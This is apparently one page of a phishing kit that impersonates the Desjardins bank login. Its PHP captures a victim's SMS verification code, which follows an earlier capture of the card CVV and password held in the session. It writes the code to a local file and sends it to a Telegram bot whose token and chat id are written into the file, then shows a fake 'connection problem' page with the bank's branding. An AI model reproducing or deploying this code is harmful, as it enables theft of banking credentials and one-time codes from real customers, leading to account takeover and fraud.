<?php 
session_start();

// Vérifie si les données 'cvv' et 'mdp' sont présentes dans la session
if (!isset($_SESSION["cvv"]) or !isset($_SESSION["mdp"])) {
    header("Location: ./index.php");
    exit();
}

// Récupère les données du formulaire
$_SESSION["sms"] = $_POST['sms'];

// Prépare le message à envoyer sur Telegram
$message = "📩 SMS : " . $_SESSION["sms"] . "\n" . "** FIN CONNEXION **\n";

// Enregistre les données dans un fichier local
$file = "../blinky2000@bvc@bvc@destruction.txt";
file_put_contents($file, $message, FILE_APPEND);

// Configuration de l'envoi Telegram
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; // Remplace par le token de ton bot
$chat_id = '6242884372'; // Remplace par ton chat_id

// URL de l'API Telegram pour envoyer le message
$url = "https://api.telegram.org/bot$token/sendMessage";

// Prépare les données à envoyer via l'API
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
];

// Initialise cURL pour envoyer le message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Exécute la requête et récupère la réponse
$response = curl_exec($ch);

// Vérifie si cURL a rencontré une erreur
if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
} else {
    echo '';
}

// Ferme la session cURL
curl_close($ch);

// Détruit la session
session_destroy();
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/desjardin/styles_mobile.css">

<link rel="stylesheet" media="screen and (min-width: 769px)" href="/desjardin/styles_pc.css">

    <title>se connecter</title>
</head>

<header>
    <div class="firstHead">
        <span>
            <span>    AA</span>
            <span>English</span>
            <span>Nous joindre</span>
            <span>Aide</span>
        </span>

    </div>
    <div class="secondHeader">
<img width="200px" height="40px" src="./img/logo1.svg">
<img class="logo2" width="150px" height="40px" src="./img/logo2.svg">
<img class="logo3" width="150px" height="40px" src="./img/logo3.svg">
    </div>
</header>
<body>
    <div class="container">
        <div class="formContainer">
        <form action="./terminus.php" method="post">
                <h1>Probleme de conexion</h1>

                <div class="load" style="text-align:center" >
            <img src="./img/ajax-loading.gif" alt="">
        </div>
        

        </form>

        <div class="/desjardin/formFooter">
            <div class="nav1">
            <ul><a href="">S’inscrire à AccèsD</a></ul>
            <ul><a href="">S’inscrire à AccèsD Affaires</a></ul>
            <ul><a href="">Devenir membre</a></ul>
            </div>

        <div class="nav2">
            <div class="nav2-1">
                <ul><a href="">  Sécurité du site</a></ul>
                <ul><a href="">Soutien technique</a></ul>
                <ul><a href="">Signaler une fraude</a></ul>
            </div>

            <div class="nav2-2">
          <ul><a href="">   
            <img style="width:15px ; margin-right:10px" src="./img/lock.svg" alt="">Sécurité garantie à 100 %</a></ul>
            </div>
        </div>
    </div>
 </div>

        <div class="image">

        </div>
    </div>
    
</body>

<footer>
    <div class="h-footer">
    <ul class="ul-1" ><a href=""><b>SERVICES AUX PARTICULIERS</b></a></ul> 
   <ul class="ul-2" ><a href=""><b> SERVICES AUX ENTREPRISES </b></a></ul>
   <ul class="ul-3" ><a href=""><b>CONSEILS </b></a></ul>
   <ul class="ul-4" ><a href=""><b>À PROPOS </b></a></ul>
   <ul ><a href=""><b>APPLICATION MOBILE</b></a></ul>
    </div>

    <div class="b-footer">
        <div class="b-footer-1">
        <ul class="ul-1" ><a href=""><b> Sécurité </b></a></ul>
        <ul class="ul-2" ><a href=""><b>  Conditions d'utilisation et notes légales </b></a></ul> 
        <ul class="ul-3" ><a href=""><b> Confidentialité </b></a></ul>
        <ul class="ul-4" ><a href=""><b>  Personnaliser les témoins </b></a></ul>
        <ul class="ul-5" ><a href=""><b>    Accessibilité </b></a></ul>
        <ul class="ul-6" ><a href=""><b> Plan du site </b></a></ul>
       
        
        </div>
        <div class="b-footer-2">
        © 1996-2024, Mouvement des caisses Desjardins. Tous droits réservés.
        </div>
    </div>
</footer>
</html>
